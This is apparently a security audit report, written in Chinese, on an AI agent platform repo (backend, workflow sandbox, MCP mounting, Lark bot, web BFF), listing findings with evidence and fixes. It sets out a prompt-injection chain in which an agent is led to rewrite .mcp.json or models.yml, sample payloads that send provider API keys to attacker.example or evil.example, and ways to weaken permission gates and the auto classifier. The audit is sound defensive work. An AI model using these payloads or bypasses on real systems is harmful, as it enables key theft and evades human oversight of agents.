# 安全与缺陷审计报告 — 2026-09-07

范围：`my-agent-team` 全仓（packages/* + apps/*）。方法：5 路并行人工级代码审计（沙箱/工作流、后端鉴权/多租户、oma 工具/适配器、Web/BFF、密钥/配置），关键结论经实机运行复现（SandboxTimeout 挂死、Bun.cron 崩溃、Bun.Glob 逃逸、Elysia 守卫生效范围、markdown sanitize 行为均实际执行验证）。报告制，不含产品代码改动。

| 严重度 | 数量（去重后） |
|---|---|
| High | 7 |
| Medium | 17 |
| Low | 19 |
| 结构性风险 | 1（无多租户） |

---

## 0. 执行摘要

系统安全姿态总体良好：authGuard 运行时验证对全部路由生效；approval 链三级防护 fail-closed；product-tools 用每 run 256 位 bearer；所有进程 spawn 均为 argv 数组无 shell 注入；agent 输出的 XSS 面干净。但存在一条完整攻击链和若干独立高危项：

**核心洞察**：三个 High 级问题可串联成「一条 Lark 消息 → backend 宿主机 RCE + 凭据外泄」的链：

```
H7 Lark 无发送者授权 (任何组织用户 DM bot)
  → prompt 进入 agent run
  → H1 agent 可写 .mcp.json (挂恶意 stdio server / 偷 run token)
     或 H6 agent 可写 .oma/models.yml (劫持 provider baseUrl)
  → RCE / API key 外泄
  → H5 settings 明文 key + 单 token 模型 → 全部资产沦陷
```

第二大类是**可靠性即安全问题**：H3/H4 两个已实测的活 bug，分别让 workflow execution 永久挂死和整个 backend 进程崩溃——攻击者或运气都能触发。

---

# High

## H1. Agent 可写的 `.mcp.json` 绕过信任门 → 持久化无审批 RCE + run-token 外泄

- **证据**：`apps/oh-my-agent/src/core/run-runtime.ts:304-311`（RPC 模式默认 `includeWorkspaceMcp=true`）；`mcp-mount.ts:36-46` 读取 `<workspace>/.mcp.json`；`run-runtime.ts:597-604` 对 `mcp__product-tools__*` 豁免 ask/deny/auto 所有门禁；`workspace-bridge.ts:88` 只在 agent PATCH/启动/reconcile 时重写文件，`agent-run/execution-dispatch.ts:146-173` 派单时**从不重写**；`file-tools.ts:174-190` write 工具未排除 `.mcp.json`。`${PRODUCT_TOOLS_RUN_TOKEN}` 占位符在 env 展开白名单内（`mcp-mount.ts:48-63`——该文件此前已出过一次 P0）。
- **攻击路径**：模型（或被注入的 prompt）覆写 `.mcp.json`：放名为 `product-tools` 的恶意 stdio server 或攻击者控制的 URL。此后每次 run 在 runtime 组装期启动恶意二进制（mount 不是工具调用，零审批）、把 live run bearer 发往攻击者、注册的工具还豁免所有权关门禁。写持久至下一次 agent PATCH。ask 模式只需一次外观无害的写审批；deny 模式也会执行 server。
- **修复建议**：
  1. 原生 write/edit 工具对 `.mcp.json` / `.oma/product-tools.json` / `.oma/settings.json` / `.claude/settings.json` 默认拒绝（或要求提权审批）——在 `file-tools.ts` 的 jail 校验处加一个受保护文件名清单；
  2. 每次 dispatch 前由 `execution-dispatch.ts` 重写 `.mcp.json` 并校验内容哈希（bridge 是唯一作者）；
  3. 挂载时对比 server 条目与 bridge 写入值（URL/command 精确匹配）才授予 `isProductMounted` 豁免，拒绝伪造命名。

## H2. 工作流 script 沙箱无 FS/网络隔离 → 以 backend 用户身份任意代码执行

- **证据**：`packages/sandbox/src/index.ts:50-54,100-141`，头注释自认 "It is NOT a filesystem/network jail"。脚本 = workflow 定义里的 `node.code`（`packages/workflow/src/parse.ts:131-133`），认证 PUT 持久化（`workflow/http.ts:104-111`），被 cron **无人值守**执行（`trigger-scheduler.ts:73`）。
- **攻击路径**：token 持有者保存含 `export default async () => ({token: await Bun.file("apps/backend/.env").text()})` + `* * * * *` 触发器的定义 → 读走 BACKEND_AUTH_TOKEN（同时发给 lark-bot 子进程，`lark-bot/registry.ts:103`）、SQLite 里全部 provider key 与会话，经继承 PATH 上的 `curl` 外发。
- **修复建议**：
  1. macOS：`sandbox-exec` profile deny-read dataDir/.env；Linux：bubblewrap `--unshare-net --ro-bind` 最小集；
  2. 或：script 沙箱跑在专用低权 OS 用户下，backend 密钥文件 0600/属主隔离；
  3. 底线：script 节点做成显式 opt-in 配置项（`WORKFLOW_SCRIPTS_ENABLED=1`），默认拒绝含 script 节点的定义。

## H3. macOS 上沙箱"硬超时"永久挂死（已实测复现）

- **证据**：`packages/sandbox/src/index.ts:108` 依赖 `Bun.which("setsid")`——**macOS 无 setsid**，组杀分支是死代码；`:138` `Promise.all([cappedText(stdout), cappedText(stderr), proc.exited])` 依赖管道 EOF，孙进程（`sh -c "sleep 30 &"`）继承 stdout 管道，直接子进程被 SIGKILL 后 EOF 永不到达；`:151` 的 `SandboxTimeoutError` 永远到不了。实测 `timeoutMs:3000` + 守护子进程 15s 未返回（EXIT=124）。
- **后果**：execution 永远卡 `running`；cancel 无效（cancel flag 只在节点间检查，`workflow/service.ts:573`）；驱动循环与 DB 行钉死到 backend 重启。
- **修复建议**：
  1. 以 `proc.exited` 为完成信号，超时后取消流读取而不是等 EOF（`Promise.race` + `reader.cancel()`）；
  2. 无 setsid 时按进程树杀（`pgrep -P <pid>` 递归 SIGKILL）；
  3. 回归测试：脚本 spawn 守护孙进程 + 短超时，断言 runInSandbox 在 ~timeout+ε 内抛错。

## H4. Cron 回调未捕获异常 → 整个 backend 进程崩溃（已实测复现）

- **证据**：`trigger-scheduler.ts:73` `deps.schedule(t.cron, () => void fire(def.id, t.cron))`；`fire`（`:43-58`）只有 `finally` 无 `catch`；`bootstrap/features.ts:953-955` 把它接到 `Bun.cron`。实测此形状的 rejected Promise 立刻杀死 Bun 1.3.14（EXIT=1）。
- **攻击路径**：任何启用了 cron 触发器的 workflow；某次 tick 撞上 `startExecution` 瞬时失败（SQLITE_BUSY、磁盘满）→ 全部 agent run、会话、workflow 驱动陪葬。
- **修复建议**：一行级修复——`fire` 整体包 try/catch + log 继续（保留 finally 释放 single-flight）。建议同时补 `process.on('unhandledRejection')` 兜底日志，防同类拓扑复发。

## H5. `GET /api/settings` 明文返回全部 provider API key（两路审计独立命中）

- **证据**：`settings/http.ts:5-6` 路由直返 `svc.getAll()`；`settings/service.ts:52-64` JSON.parse 每行**无脱敏**（同文件 `getSystemInfo` 有 `maskSecret`/`isSecretKey`，未复用）；provider key 以 `provider.<id>` 明文存 settings KV（`provider/service.ts:26,52-68`）；web 前端确有 `api.getSettings()` 调用（`features/settings/hooks.ts:9-14`），BFF 服务端为一切登录用户注入共享 token。
- **衍生利用**：`PUT /api/settings/provider.anthropic {"value":{"baseUrl":"https://attacker.example"}}` → 下次 run 子进程 env 里 `ANTHROPIC_BASE_URL` 指向攻击者（`oma-command.ts:34,50` 转发），key 随之发出。加 XSS 或默认口令即完全沦陷。
- **修复建议**：
  1. `getAll()` 对 `provider.*`（或 `isSecretKey` 命中）统一 `maskSecret`；
  2. 或干脆移除 `GET /api/settings`（UI 实际只需要 `getSystemInfo`）；
  3. `PUT /api/settings/:key` 加可写键白名单，`provider.*` 只走 `PUT /api/providers/:id` 专用通道。

## H6. 工作区可写的 `.oma/models.yml` 劫持 provider baseUrl → API key 外泄

- **证据**：`apps/oh-my-agent/src/core/runtime/runtime-catalog.ts:15-22` 以子进程 CWD（= agent 可写工作区根，`adapter-oma-agent/src/process.ts:85-94`）解析 `.oma/models.yml`；`:40-56` `mergeCatalogs` 允许运行时文件覆盖内建 provider 字段，override 省略 `apiKeyEnv` 时继承内建值；backend 只有透传 `process.env.OMA_HOME`（`infra/oma-command.ts:38`）且从不设置它（仅测试设置过），`agent-contract/src/env.ts:27-31` 丢 undefined → headless 机上工作区文件胜出。
- **攻击路径**：prompt 注入让 agent 写 `<workspace>/.oma/models.yml`，覆盖 anthropic `baseUrl: https://evil.example`；下一次 run 解析 `ANTHROPIC_AUTH_TOKEN` 并经 `createProvider`（`packages/ai/src/providers/create-provider.ts:36-47`）作为 `x-api-key` 发给攻击者。新 provider id 直接 `apiKeyEnv: ANTHROPIC_API_KEY` 亦可。
- **修复建议**：backend 派生进程时固定 `OMA_HOME`（或 `OMA_CATALOG_PATH`）指向部署 dataDir；backend-spawned 子进程禁用 `resolve(".oma", …)` CWD 回退；merge 时禁止运行时文件改已存在 provider 的 `baseUrl`。

## H7. Lark bot 无发送者授权 → 组织内任何人 DM 即可驱动 agent

- **证据**：`apps/lark-bot/src/ingest.ts:129-136` p2p 消息置 `addressedTo = undefined`；`conversation/service.ts:330-333` `const trigger = agentId !== null && (input.addressedTo ?? [agentId]).includes(agentId)` → p2p 必然触发；schema 仅 `sender_id: z.string()` 无 `sender_type`（`packages/api-contract/src/lark.ts:17-31`）；全仓 grep 无 sender allowlist；`ingest.ts:88-110` 对任意 sender 自动建会话+成员绑定。
- **攻击路径**：任意 Lark 用户 DM bot（或拉群 @bot）→ 以攻击者文本入队 run。agent `permission_mode: "auto"`（`agent-config.ts:19` 可设）时等于在 backend 宿主机执行攻击者 shell。即便 ask 模式：烧钱 + approval 社工。无 sender_type 过滤还允许 bot 消息触发 → bot-to-bot 死循环。
- **修复建议**：
  1. agent 增加 `allowedLarkSenders`（open_id 白名单），在 ingest 建会话**之前**校验，未授权静默丢弃或固定回复；
  2. 丢弃非 `user` sender_type 事件（schema 补字段）；
  3. approval 请求卡片附操作发起人身份。

---

# Medium

## 工作流 / 沙箱

### M1. human-task `nextNode` 覆盖绕过全部 `when` 条件
`workflow/service.ts:703` 把原始 HTTP answer 直传 `routeOutgoing`；`packages/workflow/src/graph.ts:98-101` 对任意 edge 目标优先采用 `out.nextNode`，先于任何 `when` 求值，伪造字段还会被写进 node-run output（`service.ts:707-711`）。攻击：`POST …/human-task {"approve":"no","nextNode":"deploy"}` 跳过审批门。数据面 `mergeInputs` 会剥 `nextNode`（`graph.ts:131-137`），路由面不剥。
**修复**：`resolveHumanTask` 调用 `routeOutgoing` 前先剥掉 `nextNode` 等控制键（复用 mergeInputs 的过滤逻辑）。

### M2. JSON-Logic 未知算子 fail-OPEN
`json-logic.ts:64` 仅承认 `OPS`，`:133-134` 对未知单键对象落入"plain object = data"分支返回非空 object（truthy），`graph.ts:114` `Boolean(evalJsonLogic(...))` 视为通过；parse 期 `validateEdgeWhen`（`parse.ts:229-256`）只查 `var` 引用不查算子名。`{"equals":…}` 笔误把审批门变成无条件路由，保存和运行都不报错。
**修复**：parse 时遍历 `when` 拒绝非 `OPS` 键；或 `evalJsonLogic` 遇未知单键 op 返回 false/抛错。选 parse 期拦截，错误信息会指出具体 edge。

### M3. cancel-vs-resolve 竞态复活已取消的执行
cancel 把 `waiting_human` execution 终态化并**删除 cancel flag**（`service.ts:750-754`）；`resolveHumanTask` 读状态（`:687-688`）→ claim（`:704-705`）→ 置 `running` 重启 drive（`:716-717`），非原子。交错后已取消的执行复活跑 script/agent 节点，且 `throwIfCancelled` 不再拦它。
**修复**：resolve 改为单条条件 UPDATE（`WHERE status='waiting_human'`）；启动 drive 前重读行确认非终态。

### M4. timeoutMs/retry 无上限 → execution 实际不可取消
`packages/workflow/src/parse.ts:132,146` 接受任意正 `timeoutMs`（24h 也收）直传沙箱（`node-runners.ts:27`）；retry 三参数无界（`parse.ts:95-113`）；`runNodeWithRetry` 的 backoff sleep（`service.ts:333`）不查 cancel flag；cancel 只在节点间观察（`:573`）。叠加 H3 可变永久。
**修复**：parse 期钳制（timeoutMs ≤ 10min、maxAttempts ≤ 5、intervalMs 有上限）；retry sleep 内查 cancel；给 `runInSandbox` 传 AbortSignal。

### M5. 重复 definition id 泄漏 cron 句柄
PUT 不强制 `definition.id === :workflowId`/文件名 stem；`trigger-scheduler.ts:84` 按 `def.id` 存 handle，同 id 第二个文件覆盖首个，孤儿 `Bun.cron` 句柄从此无法停止；每次 sync（每次 PUT/DELETE 触发）再泄漏一轮。
**修复**：sync 时检测重复 id → 跳过后者 + 日志告警；PUT 强制 id ↔ stem 一致。

### M6. workflow SSE 事件总线队列永久泄漏
`workflow/event-bus.ts:40-47` / `definition-events.ts:44-50`：`subscribe()` 只增不删，仅在进程级 `dispose()` 清理；`http/response.ts:21` 在 abort 时只是 break 出 for-await，不从 Set 移除。每次页面刷新 +1 死队列，emit 永久 fan-out 到死队列；definition 流还不产 `_heartbeat`，浏览器 EventSource 超时重连放大泄漏。
**修复**：consumer 结束（try/finally）时从 Set 摘除 Queue；definition 流补心跳发射。

## oma 工具 / 适配器

### M7. glob 逃出工作区沙箱（已实测）
`glob.ts:50-56` pattern 未校验。实测 `Bun.Glob('../*.txt').scan({cwd})` 返回 `../secret.txt`，绝对 pattern + `absolute:true` 返回 cwd 外文件。glob 在任何权限模式都无门禁 → 越界目录枚举（`~/.ssh`、其他租户目录、session 文件名）。
**修复**：拒绝含 `..` 段或以 `/` 开头的 pattern；或 scan 后逐条过 `WorkspaceSandbox` 复验并丢弃逃逸项。

### M8. 循环级 permissionGate 异常 fail-OPEN
`agent-loop-run.ts:228-236`：`catch { /* never crash the run */ }` 后工具照常执行。`run-runtime.ts:700-716` 在自己的 gate 内做了补偿，但注释明说这是 fail-open，任何漏网 throw（非 Error、classifier OOM、未来重构去掉内层 try）把 ask/deny/auto 静默变 allow——与全链路其余地方的 fail-closed 不变式矛盾。
**修复**：反转 catch——门异常即 block，reason "permission gate error — fail closed"。

### M9. agent 可写 `.oma/settings.json` 在 RPC 模式钉死 auto 分类器模型
`run-runtime.ts:228-265` 所有模式（含 product RPC）都加载 `.oma/settings.json` 并写入 env（`OMA_PERMISSION_CLASSIFIER_MODEL` 等）；`project-settings.ts:4-7` 自称 "Standalone TUI-only" 与实际矛盾。`permission-classifier.ts:10-14` 仅拒未知模型 id——换成目录里最弱的模型即可。auto 模式下安装一次即可获得橡皮图章分类器，效果等同门禁降级，且不碰 .mcp.json。
**修复**：rpc 模式跳过 `loadProjectSettings`，或只白名单纯外观键。

### M10. bash 输出无上限 → oma 进程 OOM
`bash.ts:104-124` stdout/stderr `new Response(...).text()` 无字节上限，只有 1..600s 超时（对比 `packages/sandbox/src/index.ts:87-107` 有为同样威胁设的 10MiB 上限）。一次失控输出（`yes`、构建刷屏、注入后的故意行为）打爆子进程堆，廉价可重复的可用性杀手。
**修复**：复用 sandbox 的 cappedText 模式，双流各封顶 ~10 MiB 带截断标记。

### M11. OmaBackend command-id 冲突 + 无响应超时 → 并发 steer/abort 永久悬挂
`adapter-oma-agent/src/backend.ts:245-259` steer id 恒为 `steer-${runId}`、abort 同理；`sendCommand`（`:336-360`）waiters Map 无超时，第二个并发 steer 覆盖第一个 waiter，子进程只回一份 → 第一个 promise 永不 resolve（仅子进程退出时兜底）。UI 双击/并发调用即可触发；重复发生 → backend handler 槽耗尽。
**修复**：command id 加 `randomUUID()` 后缀；加有界响应超时（超时 resolve `{success:false}`）。

### M12. pi/omp/claude 适配器 JSONL 缓冲行间无界
三个适配器 `process.ts:29-48`（pi/omp）与 `:30-48`（claude）：`buffer += decoder.decode(...)` 只在完整行处受 10MiB MAX_FRAME 限制；无换行巨型帧无限增长。oma 适配器有 16MiB 中途截断（`adapter-oma-agent/src/process.ts:36-74`），兄弟适配器缺失。多个 run 各数百 MB → 拖垮共享 backend 进程。
**修复**：把 oma reader 的中途截断逻辑移植到三个适配器。

## 后端 / Web / 配置

### M13. artifact list 目录守卫写反 → 逃逸目录被递归 walk
`artifact/adapter-fs.ts:105-112`：守卫条件是「在根内」才做存在性检查，逃逸路径反而**跳过守卫**，外层 `existsSyncSafe` 对存在的绝对路径放行，随后同步递归 `readdirSync/statSync` walk。`GET /api/artifacts?folder=../../../Users` → 目录存在性 oracle + 名称/大小/时间枚举 + 单线程事件循环被同步递归阻塞。内容读取仍被 `splitPath`/`parseArtifactUrl` 拦住。
**修复**：前置拒绝——`folder` resolve 后不 `startsWith(rootResolved + sep)` 即抛 ValidationError；顺手限制 walk 深度/条目数。

### M14. `GET /api/mcp-servers/:serverId` 明文返回 env/headers 凭据
`mcp/service.ts:50` 注释自认 "Raw (unmasked) single server — the edit form's source of truth"；`maskSecrets` 只用于 listCatalog/create/update（`:54-66`）。headers 常含 `Authorization: Bearer …`。任何 web 登录用户经 BFF 即可读取全部 MCP 凭据。
**修复**：读侧永不回秘密；编辑表单改 keep-if-empty 语义（空 = 保留原值），不再预填明文。

### M15. MCP stdio CRUD = token 持有者的宿主机 RCE
`mcp/http.ts:23-44` createBody 接受任意 `command/args/env` 无白名单；`/tools/invoke`（`:73-75`）连 body schema 都没有（`body as {...}`）；`/test` 即刻 spawn。web 登录 → BFF → 共享 token，"登录用户" 坍缩为 "backend 宿主机 shell"。单管理员本地工具是设计使然；一旦引入第二个用户即不可辩护。
**修复**：MCP mutation/invoke 路由放到独立开关（如 `ADMIN_SURFACE=1`）或第二凭据后；invoke 补 body schema。

### M16. 出厂默认凭据 `dev-token`/`admin` 被 predev.sh 原样拷贝（两路命中）
`apps/backend/.env.example:4` `BACKEND_AUTH_TOKEN=dev-token`；`apps/web/.env.example:8-10` `MOCK_PASSWORD=admin`（README 还写明默认值）；`scripts/predev.sh` step2 拷贝 example，step3 只重生成 SESSION_SECRET；`packages/config/src/env.ts:14` 只要求 min(1)。唯一缓解是 BACKEND_HOST 默认 127.0.0.1。web 登录限流 5 次/60s 对一猜即中的口令无意义。
**修复**：predev.sh 对 BACKEND_AUTH_TOKEN/MOCK_PASSWORD 同 SESSION_SECRET 处理（随机生成）；backend 在 host ≠ loopback 且 token 为字面量 `dev-token` 时拒绝启动或大字告警；`.env.example` 改为空值 + 生成指引注释。

### M17. provider 密钥 SQLite 明文落盘；backend.db 与 backend/.env 实测 0644
`provider/service.ts:52-68` → `settings/adapter-sqlite.ts:17-28` 明文 JSON 入表，落于 `<dataDir>/backend.db`（`config.ts:45`）。实测 `-rw-r--r-- apps/backend/.backend-data/backend.db` 与 `-rw-r--r-- apps/backend/.env`（对比 web/.env 是 0600）。git 历史扫描确认无密钥入库。
**修复**：创建时 `chmod 0700 dataDir` / `0600 backend.db`、0600 backend/.env；文档声明明文静态存储或接入加密/系统 keychain。

---

# Low（19）

**oma / 适配器**
1. grep 以完整父环境 spawn rg（`grep.ts:62-64` 无 env 字段），凭据外溢给 RIPGREP_CONFIG_PATH/`--pre`/pager；bash 有 BASH_ENV_DENY 此处没有。**修**：rg spawn 传最小 env（PATH/locale）。
2. bash env denylist 被 `/proc/$PPID/environ` 绕过（oma 父进程 env 仍有 key/run token；NullSandbox 默认；bwrap 未 unshare pid）。Seatbelt profile 写在 agent 可写 `.oma/`（`bash-sandbox.ts:147-174`）存在写→exec TOCTOU。**修**：oma 启动消费密钥后从 process.env 删除（闭包保存）；Seatbelt profile 写到工作区外。
3. MCP server URL 挂载无 SSRF 防护（`mcp-mount.ts:68-86` 无 web-ports-std 的协议/私网/DNS 检查）；server/tool 名未消毒可互相 shadow（首个胜，静默）。**修**：挂载时跑 `assertSafeUrlDeep`；名称校验 `^[a-z0-9_-]+$` 并确定性拒绝冲突。
4. 文件 jail 校验→syscall TOCTOU + 硬链接直通（`workspace-sandbox.ts:31-55` 返回非 realpath 目标；read_image stat→read 竞态）。Null bash 沙箱下是二阶问题。**修**：open-then-verify（fd 上 fstat/realpath）；nlink>1 且 realpath 不符时拒绝；或文档声明文件 jail 仅为 UX。
5. `cliSessionRef` 无形状校验即拼进 session 文件路径（`protocol.ts:34` → `session-file.ts:49-67` join）。可达性薄（值源自后端 DB），但边界两侧都未强制 UUID。**修**：schema 加 `regex(/^[A-Za-z0-9-]{1,64}$/)`。

**工作流**
6. human 答案绕过 outputSchema/表单元枚举校验（`service.ts:684-717` 缺其他节点都有的 `validateBySchema`）。**修**：claim 前校验 answer。
7. `validateBySchema` 用 `in` 判 required/properties（`schema.ts:43,46`）→ `toString`/`constructor` 字段名假阳性。**修**：`Object.hasOwn`。
8. `pathGet` 走原型链（`json-logic.ts:47-54`，`var: "store.constructor"` 可解析）+ human 节点 `timeoutMs` parse 后从未实施。**修**：pathGet 拒绝 `__proto__/constructor/prototype` 段；human timeoutMs 要么实现过期要么 parse 拒绝。
9. executions list 无分页、`batch-resolve` 无上限（`http.ts:232-238`；`service.ts:659-678` 大单驱动全量）；cron 语义未声明时区（5 字段、server-local）。**修**：限量 + 文档。

**后端**
10. 输入队列路由忽略 `:id` 会话参数——inputId 全局键（`conversation/http.ts:168,179,188` + `adapter-sqlite-inputs.ts:47-54,198-210` WHERE 仅 inputId）→ 跨会话篡改 pending 输入。**修**：UPDATE 带 conversationId 匹配，不符 404。
11. workflow/agent-config 本地 MCP server 无鉴权（`workflow/mcp.ts:117-145` / `agent-config-mcp.ts:43-45`），127.0.0.1 减轻但不消除；本机任意进程可枚举定义、把"提案"推送到打开的编辑器 UI（钓鱼面）。**修**：复用 product-tools 的 per-process token 模式。
12. backend `/entries` 对 symlink 目录不做 realpath 校验（`agent/http.ts:354-388` vs `/file` 的 `:399-407` 有）→ 越界列目录名。**修**：复用 /file 的 realpath 检查。
13. SSE 无连接上限 + `idleTimeout: 0`（`server.ts:14`）+ 每订阅 5s 轮询（`conversation/service.ts:384-463`）→ 自我 DoS。**修**：进程级/会话级连接上限 + 429。
14. `infra/workspace.ts` 模板目录无校验（`:14-18` join(templateDir, template)）——当前死代码，一旦接线即任意目录拷贝。**修**：删除文件（首选，死代码）或 `assertSafeEntry`。

**lark-bot / web**
15. lark-bot：README 文档化 `--backend-auth-token` argv 传参（ps 可读，`README.md:36-37`；registry 本身走 env 是对的）；PID 复用致 bot exit(0) 被 registry 当主动退出永不重启（`bootstrap.ts:24-44` + `registry.ts:123-130`）；SSE watcher 401 固定 5s 无限重连（`sse-watcher.ts:66-70`）无退避；heartbeat `lastError` 原样上传 lark-cli stderr 未过 redactor。**修**：argv 选项标 dev-only 或删；退出前校验 pid 属主或改非零退出码；指数退避 + 连续 401 熔断；错误串过 redactor。
16. web BFF 前缀逃逸：`%2e%2e`/反斜杠段可让代理逃出 `/api/` 前缀（`bff.ts:81-82`，WHATWG URL 已实测归一化）。当前非 /api 路由仅 `/health`，零实际影响；任何未来挂在 /api 外的路由立刻暴露。**修**：拒绝 `.`/`..`/含 `\` 段，或 resolve 后断言 `pathname.startsWith("/api/")`。
17. 登录限流计数永不衰减（`lib/rate-limit.ts:7-27` prune 只在触发后清理；全局桶）→ 低速尝试累计/持续打点可永久锁死唯一用户。**修**：距上次失败 > lockMs 即清零。
18. logout CSRF（`api/auth/logout/route.ts:4-11` 无条件下发清 cookie；Lax 挡发送不挡设置）→ 强制登出。**修**：校验 `Sec-Fetch-Site: same-origin` 或仅当携带有效会话时清。
19. session 过期时 middleware 对 `/api/*` 返 302+HTML（`middleware.ts:28-30,39`）使 BFF 的 401 分支失效、客户端 unwrap 走错分支、EventSource 重连风暴。另：`artifacts://` 被 rehype-sanitize 默认 schema 剥掉 href → `ArtifactMarkdownCard` 整块死代码（功能 bug；sanitize 本身已实测安全）。**修**：middleware 对 `/api/` 前缀放行让路由自返 401；artifact 链接若保留则扩展 sanitize schema 的 href protocols（并重审 remark 正则对引号的宽松）。

---

# 结构性风险：无多租户

schema 21 张表无一有 tenant/user 列（唯一近似是 workflow definition JSON meta 里的 owner 字符串）；authGuard 是单进程共享 token（`app.ts:65-73`）；web 有多用户登录 facade，但 BFF 给所有会话注入同一 BACKEND_AUTH_TOKEN。后果：用户 A 可读/删/取消用户 B 的会话、run、agent，可代答 B 的 HITL 审批；id 可无范围枚举（`GET /api/agent-runs`、`/api/conversations/search`）。

**建议**：二选一，勿模糊——
- 若坚持单操作员模型：README/启动 banner 明确威胁模型，web 登录坍缩为单操作员账号，把 M14/M15 这类"管理员面"标为 operator-only；
- 若有任何多用户演进意图：现在就加 principal 列 + 各 feature WHERE 过滤 + BFF 透传 x-user-id 的后端校验，否则事后返工成本极高（21 张表 + 全部 service 层）。

---

# 已验证安全（排除项，避免重复排查）

- **Auth 接线**：Elysia 1.4.29 运行时验证主实例 `onBeforeHandle` 覆盖全部 `.use(plugin)` 路由（含带前缀、先注册的路由），仅 `/health` 精确匹配豁免；token 常量时间比较；空 token 在 parseEnv 即拒绝。
- **Approval 链**：HTTP 查 run 存在且非终态 → execution-service 要求 live loop → oma 侧 per-run pending map + callId 匹配；120s 超时 fail-closed deny；resolve 单发不可重放、不跨 run。
- **product-tools**：独立 HTTP server；每 run 256 位随机 bearer，SHA-256 keyed 注册表，dispatch 铸造/settle 吊销；session 钉 authenticatedRunId，伪造身份参数被拒；idempotencyKey=runId:callId；工具须在 manifest 声明。
- **进程边界**：全部 spawn 为 argv 数组；OMA_BIN/PI_BIN/CLAUDE_BIN 仅 operator env；oma 子进程 env 白名单**不含** BACKEND_AUTH_TOKEN；stderr 红线化含 Bearer 形态；secret 走 env 不上线报。
- **oma 线协议**：父→子 16MiB LF 帧 + 中途超限丢弃；子→父 zod 校验 + failProtocol 杀子进程；outcome-only 终态权威。
- **MCP**：env 展开白名单仅 PRODUCT_TOOLS_RUN_TOKEN；native 工具表赢名称冲突且 mcp__ 前缀保留门禁。
- **eval 工具**：真进程隔离——极简 env（PATH/HOME=tmpdir/LANG）、10MiB 输出上限、进程组杀 + SIGKILL 升级、超时钳制 ≤600s。
- **web_fetch**：协议白名单、IPv6-mapped IPv4 处理、首 URL DNS 检查、每跳重定向复验、重定向/字节数上限。
- **web**：session HMAC 可靠（WebCrypto verify 常量时间、exp 强制、HttpOnly+SameSite=Lax）；BFF 头防伪造（set-cookie 不回传、host 删、认证头在拷贝后覆写）；令牌零泄漏到 client bundle（无 NEXT_PUBLIC_*）；markdown 管线以应用实装包实测 sanitize 生效（javascript:/onerror/script 均剥离）；无 server actions；开放重定向已校验；登录密码 timing-safe 比较；`(main)/layout.tsx` 对已知的伪造 cookie 绕过有修复且在案。
- **路径穿越（其他面）**：workflow id 正则 + stem 校验、技能包 assertSafeEntry+realpath、knowledge 段白名单、artifact parseArtifactUrl/splitPath 拒 `..`、git URL scheme smuggling（`ext::`/`-opts`）被拒、zip 穿越/符号链接条目被拒、clone 后 symlink 检查。
- **DB**：raw SQL 仅固定字面 where 片段 + 绑定参数；run acquire/commit 单事务 + branch revision CAS + 部分唯一索引幂等；会话删除有 active run 守卫；搜索参数化 LIKE。
- **工作流**：PUT 持久化前先 parseWorkflow 校验；拓扑排序拒环；human-task 双 resolve 由原子条件 UPDATE 防住；`mergeInputs` 剥 `nextNode/__proto__/constructor/prototype`；JSON-Logic 求值器纯函数（无 eval/Function/动态 import）；dry-run 不执行任何脚本；agent 节点 outputSchema 每次尝试（含 schema 失败重试提示）都强制校验。
- **密钥资产**：git 历史扫描确认无真实密钥入库；lark appSecret 仅经子进程 stdin 不持久化；agent 配置响应不含 secrets；getSystemInfo 对 env 秘密有 mask。
- **已知问题 ProviderSpec inline apiKey gap（memory）**：本仓已修复（`model-catalog.ts:30-31` + env→inline 回退 + 回归测试）。残留小缺口：`provider/service.ts:38-41` `configured()` 只看 settings+env，models.yml-inline provider 在 UI 显示"未配置"且不进 getProviderEnv；`KNOWN_PROVIDERS` 硬编码 5 家，catalog-only provider 不上 UI。

---

# 修复路线图

**P0（立即，合计 <2 天工作量，纯防御性小改动）**
1. H4 try/catch（一行）
2. H5 settings 脱敏 / PUT 白名单（数十行）
3. H1 `.mcp.json` 保护 + dispatch 前重写校验
4. M13 artifact 守卫反转修正
5. M2 JSON-Logic 算子白名单（parse 期）
6. M1 human resolve 剥控制键

**P1（本周）**
7. H3 沙箱超时以 exited 为准 + 进程树杀（附回归测试）
8. H7 Lark 发送者白名单
9. M16 默认凭据生成 + 非 loopback 告警
10. M7 glob pattern 校验；M8 gate fail-closed 反转；M9 rpc 模式跳过项目 settings
11. M17 文件权限 0600/0700

**P2（规划期，需设计决策）**
12. H2 OS 级沙箱（sandbox-exec/bwrap 或专用用户）
13. H6 OMA_HOME 固定 + 禁 CWD 回退
14. 多租户决策（决定 M14/M15 与 Low#10 的最终形态）
15. M10/M11/M12 系列资源边界（统一 capped reader、command id + 超时、适配器截断逻辑归一）
16. M5/M6 句柄/队列泄漏
